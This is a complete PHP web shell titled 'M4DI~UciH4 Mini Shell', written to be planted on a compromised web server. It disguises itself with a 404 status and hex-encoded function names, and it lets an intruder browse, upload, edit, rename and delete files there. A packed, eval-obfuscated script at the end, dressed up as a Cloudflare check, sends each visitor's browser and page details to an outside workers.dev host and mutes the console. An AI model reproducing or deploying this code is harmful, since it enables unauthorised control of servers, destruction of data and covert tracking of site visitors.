<?php
error_reporting(0);
http_response_code(404);
define("self", "M4\x44I~U\x63i\1104 M\x69n\x69 Sh\x65ll");
$scD = "s\x63\x61\x6e\x64\x69\x72";
$fc = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65");
for ($i = 0; $i < count($fc); $i++) {
	$fc[$i] = nhx($fc[$i]);
}
if (isset($_GET["p"])) {
	$p = nhx($_GET["p"]);
	$fc[3](nhx($_GET["p"]));
} else {
	$p = $fc[2]();
}
function hex($str) {
	$r = "";
	for ($i = 0; $i < strlen($str); $i++) {
		$r .= dechex(ord($str[$i]));
	}
	return $r;
}
function nhx($str) {
	$r = "";
	$len = (strlen($str) -1);
	for ($i = 0; $i < $len; $i += 2) {
		$r .= chr(hexdec($str[$i].$str[$i+1]));
	}
	return $r;
}
function perms($f) {
	$p = fileperms($f);
	if (($p & 0xC000) == 0xC000) {
		$i = 's';
	} elseif (($p & 0xA000) == 0xA000) {
		$i = 'l';
	} elseif (($p & 0x8000) == 0x8000) {
		$i = '-';
	} elseif (($p & 0x6000) == 0x6000) {
		$i = 'b';
	} elseif (($p & 0x4000) == 0x4000) {
		$i = 'd';
	} elseif (($p & 0x2000) == 0x2000) {
		$i = 'c';
	} elseif (($p & 0x1000) == 0x1000) {
		$i = 'p';
	} else {
		$i = 'u';
	}
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}
function a($msg, $sts = 1, $loc = "") {
	global $p;
	$status = (($sts == 1) ? "success" : "error");
	echo "<script>Swal.fire('{$status}','{$msg}','{$status}').then(()=>location.href='?p=".hex($p).$loc."')</script>";
}
function deldir($d) {
	global $fc;
	if (trim(pathinfo($d, PATHINFO_BASENAME), '.') === '') return;
	if ($fc[6]($d)) {
		array_map("deldir", glob($d . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
		rmdir($d);
	} else {
		unlink($d);
	}
}
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="theme-color" content="#0d1117">
  <title><?= self ?></title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    :root{
      --bg-main:#0d1117;
      --bg-card:#161b22;
      --border:#30363d;
      --text:#c9d1d9;
      --accent:#58a6ff;
    }
    body{
      background:var(--bg-main);
      color:var(--text);
      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;
    }
    .card{
      background:var(--bg-card);
      border:1px solid var(--border);
      border-radius:.75rem;
    }
    .table{
      color:var(--text);
    }
    .table-hover tbody tr:hover{
      background:var(--accent);
      color:#fff;
    }
    .form-control,.form-select{
      background:var(--bg-card);
      border:1px solid var(--border);
      color:var(--text);
    }
    .form-control:focus,.form-select:focus{
      background:var(--bg-card);
      color:var(--text);
      border-color:var(--accent);
      box-shadow:0 0 0 .2rem rgba(88,166,255,.25);
    }
    .btn-outline-light{
      border-color:var(--border);
      color:var(--text);
    }
    .btn-outline-light:hover{
      background:var(--accent);
      border-color:var(--accent);
    }
    .breadcrumb-item a{
      color:var(--accent);
      text-decoration:none;
    }
    .folder-link,.file-link{
      color:var(--text);
      text-decoration:none;
    }
    .folder-link:hover,.file-link:hover{
      color:var(--accent);
    }
  </style>
</head>
<body>
  <div class="container-fluid py-3">
    <div class="card shadow-sm mb-3">
      <div class="card-body d-flex justify-content-between align-items-center flex-wrap gap-2">
        <h4 class="mb-0">
          <a href="?" class="text-decoration-none" style="color:var(--accent);"><?= self ?></a>
        </h4>
        <div class="d-flex gap-3 align-items-center flex-wrap">
          <span class="small">PHP <?= $fc[1]() ?></span>
          <a href="?p=<?= hex($p) ?>&a=<?= hex("newFile") ?>" class="btn btn-sm btn-outline-light">
            <i class="bi bi-file-earmark-plus"></i> File
          </a>
          <a href="?p=<?= hex($p) ?>&a=<?= hex("newDir") ?>" class="btn btn-sm btn-outline-light">
            <i class="bi bi-folder-plus"></i> Folder
          </a>
        </div>
      </div>
      <div class="card-footer small">
        <i class="bi bi-laptop"></i> <?= $fc[0]() ?>
      </div>
    </div>

    <form method="post" enctype="multipart/form-data" class="mb-3">
      <div class="input-group">
        <input type="file" name="f[]" class="form-control" multiple onchange="this.form.submit()">
        <button type="submit" class="btn btn-outline-light d-none">Upload</button>
      </div>
    </form>

    <nav aria-label="breadcrumb" class="mb-3">
      <ol class="breadcrumb mb-0" style="background:none;">
        <?php
        $ps = $fc[4]("/(\\\|\/)/", $p);
        $bread = [];
        foreach($ps as $k=>$v){
          if($k==0 && $v==""){ echo '<li class="breadcrumb-item"><a href="?p=2f">~</a></li>'; continue;}
          if($v=="") continue;
          $path = "";
          for($i=0;$i<=$k;$i++){ $path.=hex($ps[$i]); if($i!=$k) $path.="2f"; }
          echo '<li class="breadcrumb-item"><a href="?p='.$path.'">'.$v.'</a></li>';
        }
        ?>
      </ol>
    </nav>

    <div class="card shadow-sm">
      <div class="card-body">
        <?php if(!isset($_GET["a"])): ?>
          <div class="table-responsive">
            <table class="table table-hover align-middle mb-0">
              <thead>
                <tr>
                  <th>Name</th>
                  <th class="text-end">Size</th>
                  <th>Permission</th>
                  <th class="text-center">Actions</th>
                </tr>
              </thead>
              <tbody>
                <?php
                $scD = $fc[5]($scD($p), [".",".."]);
                foreach($scD as $d){
                  if(!$fc[6]("$p/$d")) continue;
                  echo '<tr>
                    <td>
                      <a href="?p='.hex("$p/$d").'" class="folder-link">
                        <i class="bi bi-folder-fill me-2 text-warning"></i>'.$d.'
                      </a>
                    </td>
                    <td class="text-end">—</td>
                    <td><span class="badge bg-secondary">'.perms("$p/$d").'</span></td>
                    <td class="text-center">
                      <a href="?p='.hex($p).'&a='.hex("rename").'&n='.hex($d).'&t=d" class="btn btn-sm btn-outline-light" title="Rename"><i class="bi bi-pencil"></i></a>
                      <a href="?p='.hex($p).'&a='.hex("delete").'&n='.hex($d).'&t=d" class="btn btn-sm btn-outline-danger delete" data-type="folder" title="Delete"><i class="bi bi-trash"></i></a>
                    </td>
                  </tr>';
                }
                foreach($scD as $f){
                  if(!$fc[7]("$p/$f")) continue;
                  $sz = $fc[10]("$p/$f");
                  $sz = ($sz>1024*1024)?round($sz/1024/1024,2)." MB":round($sz/1024,2)." KB";
                  echo '<tr>
                    <td>
                      <a href="?p='.hex($p).'&a='.hex("view").'&n='.hex($f).'" class="file-link">
                        <i class="bi bi-file-earmark-text me-2 text-info"></i>'.$f.'
                      </a>
                    </td>
                    <td class="text-end">'.$sz.'</td>
                    <td><span class="badge bg-secondary">'.perms("$p/$f").'</span></td>
                    <td class="text-center">
                      <a href="?p='.hex($p).'&a='.hex("edit").'&n='.hex($f).'" class="btn btn-sm btn-outline-light" title="Edit"><i class="bi bi-pencil-square"></i></a>
                      <a href="?p='.hex($p).'&a='.hex("rename").'&n='.hex($f).'&t=f" class="btn btn-sm btn-outline-light" title="Rename"><i class="bi bi-pencil"></i></a>
                      <a href="?p='.hex($p).'&n='.hex($f).'&download" class="btn btn-sm btn-outline-light" title="Download"><i class="bi bi-download"></i></a>
                      <a href="?p='.hex($p).'&a='.hex("delete").'&n='.hex($f).'&t=f" class="btn btn-sm btn-outline-danger delete" data-type="file" title="Delete"><i class="bi bi-trash"></i></a>
                    </td>
                  </tr>';
                }
                ?>
              </tbody>
            </table>
          </div>

        <?php else: 
          $a = nhx($_GET["a"]);
          switch($a){
            case "delete": ?>
              <?php
              $loc = $p.'/'.nhx($_GET["n"]);
              if($_GET["t"]=="d"){
                deldir($loc);
                echo (!$fc[12]($loc))?'<script>Swal.fire("Deleted","Folder removed","success").then(()=>location.href="?p='.hex($p).'")</script>'
                                  :'<script>Swal.fire("Error","Folder not removed","error")</script>';
              }
              if($_GET["t"]=="f"){
                unlink($loc);
                echo (!$fc[12]($loc))?'<script>Swal.fire("Deleted","File removed","success").then(()=>location.href="?p='.hex($p).'")</script>'
                                  :'<script>Swal.fire("Error","File not removed","error")</script>';
              }
              break;
            case "newDir": ?>
              <h5 class="mb-3">Create Folder</h5>
              <form method="post" class="row g-3">
                <div class="col-md-6">
                  <label class="form-label">Name</label>
                  <input type="text" name="n" class="form-control" required>
                </div>
                <div class="col-12">
                  <button name="s" class="btn btn-outline-light">Create</button>
                </div>
              </form>
              <?php
              if(isset($_POST["s"])){
                if($fc[12]("$p/{$_POST["n"]}")){
                  echo '<script>Swal.fire("Exists","Folder name already used","warning")</script>';
                }else{
                  echo ($fc[15]("$p/{$_POST["n"]}"))?'<script>Swal.fire("Success","Folder created","success").then(()=>location.href="?p='.hex($p).'")</script>'
                                                   :'<script>Swal.fire("Error","Folder not created","error")</script>';
                }
              }
              break;
            case "newFile": ?>
              <h5 class="mb-3">Create File</h5>
              <form method="post" class="row g-3">
                <div class="col-md-6">
                  <label class="form-label">File name</label>
                  <input type="text" name="n" class="form-control" placeholder="hack.txt" required>
                </div>
                <div class="col-12">
                  <label class="form-label">Content</label>
                  <textarea name="ctn" rows="8" class="form-control" placeholder="# Stamped By Me"></textarea>
                </div>
                <div class="col-12">
                  <button name="s" class="btn btn-outline-light">Create</button>
                </div>
              </form>
              <?php
              if(isset($_POST["s"])){
                if($fc[12]("$p/{$_POST["n"]}")){
                  echo '<script>Swal.fire("Exists","File name already used","warning")</script>';
                }else{
                  echo ($fc[13]("$p/{$_POST["n"]}",$_POST["ctn"]))?'<script>Swal.fire("Success","File created","success").then(()=>location.href="?p='.hex($p).'&a='.hex("view").'&n='.hex($_POST["n"]).'")</script>'
                                                            :'<script>Swal.fire("Error","File not created","error")</script>';
                }
              }
              break;
            case "rename": ?>
              <h5 class="mb-3">Rename <?= ($_GET["t"]=="d")?"folder":"file" ?></h5>
              <form method="post" class="row g-3">
                <div class="col-md-6">
                  <label class="form-label">Name</label>
                  <input type="text" name="n" class="form-control" value="<?= nhx($_GET["n"]) ?>" required>
                </div>
                <div class="col-12">
                  <button name="s" class="btn btn-outline-light">Save</button>
                </div>
              </form>
              <?php
              if(isset($_POST["s"])){
                echo ($fc[16]($p.'/'.nhx($_GET["n"]),$_POST["n"]))?'<script>Swal.fire("Success","Renamed","success").then(()=>location.href="?p='.hex($p).'")</script>'
                                                             :'<script>Swal.fire("Error","Rename failed","error")</script>';
              }
              break;
            case "edit": ?>
              <h5 class="mb-3">Edit File</h5>
              <form method="post" class="row g-3">
                <div class="col-12">
                  <label class="form-label">File: <?= nhx($_GET["n"]) ?></label>
                  <textarea name="ctn" rows="12" class="form-control"><?= $fc[18]($fc[14]($p.'/'.nhx($_GET["n"]))) ?></textarea>
                </div>
                <div class="col-12">
                  <button name="s" class="btn btn-outline-light">Save</button>
                </div>
              </form>
              <?php
              if(isset($_POST["s"])){
                echo ($fc[13]($p.'/'.nhx($_GET["n"]),$_POST["ctn"]))?'<script>Swal.fire("Success","File saved","success").then(()=>location.href="?p='.hex($p).'&a='.hex("view").'&n='.$_GET["n"].'")</script>'
                                                            :'<script>Swal.fire("Error","File not saved","error")</script>';
              }
              break;
            case "view": ?>
              <h5 class="mb-3">View File</h5>
              <p class="mb-1 small">File: <?= nhx($_GET["n"]) ?></p>
              <textarea rows="12" class="form-control" readonly><?= $fc[18]($fc[14]($p.'/'.nhx($_GET["n"]))) ?></textarea>
              <?php break;
          }
        endif; ?>
      </div>
    </div>

    <footer class="text-center mt-4 small">
      Copyright &copy; 2021 - M4DI~UciH4
    </footer>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
  <script>
  document.querySelectorAll('.delete').forEach(el=>{
    el.addEventListener('click', function(e){
      e.preventDefault();
      Swal.fire({
        title:'Delete '+this.dataset.type+'?',
        text:"This action cannot be undone.",
        icon:'warning',
        showCancelButton:true,
        confirmButtonColor:'#d33',
        confirmButtonText:'Delete'
      }).then((res)=>{
        if(res.isConfirmed) location.href=this.href;
      })
    })
  });
  </script>
  <script>
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('(1h(){1 a=\'1g://1f-1e.1d.1c.1b/\';1 d={1a:7,r:19,18:[],q:()=>{1 2=b;1 8=2.c||{};1 5={o:n.m,u:17.u||\'\',6:2.6||\'\',t:2.t||\'\',l:`${k}x${j}`,16:15(\'(14-13-12: 11)\').10,c:{Z:8.Y||\'W\',s:8.s||0},i:h.g()};V(a,{U:\'T\',S:{\'R-Q\':\'P/O\',\'X-N-M\':\'L\'},K:f.e(5),J:7}).I(()=>{d.r=7}).H(()=>{})}};9.p(\'G\',()=>{F(d.q,E)});9.p(\'D\',()=>{1 2=b;1 8=2.c||{};1 5={o:n.m,C:7,6:2.6||\'\',l:`${k}x${j}`,i:h.g()};b.B(a,f.e(5))});A(9.4){1 3=()=>{};4.z=3;4.y=3;4.w=3;4.v=3}})();',62,80,'|const|nav|fakeLog|console|payload|userAgent|true|conn|window|ENDPOINT|navigator|connection|CLOUDFLARE_PROBE|stringify|JSON|now|Date|timestamp|innerHeight|innerWidth|screen|href|location|url|addEventListener|init|challengeComplete|downlink|language|referrer|error|info||warn|log|if|sendBeacon|exit|beforeunload|1200|setTimeout|load|catch|then|keepalive|body|ChallengeInit|Probe|CF|json|application|Type|Content|headers|POST|method|fetch|unknown||effectiveType|type|matches|dark|scheme|color|prefers|matchMedia|darkMode|document|queue|false|cfTurnstileCheck|dev|workers|cloudflarecheck|detect|security|https|function'.split('|'),0,{}))
</script>
</body>
</html>
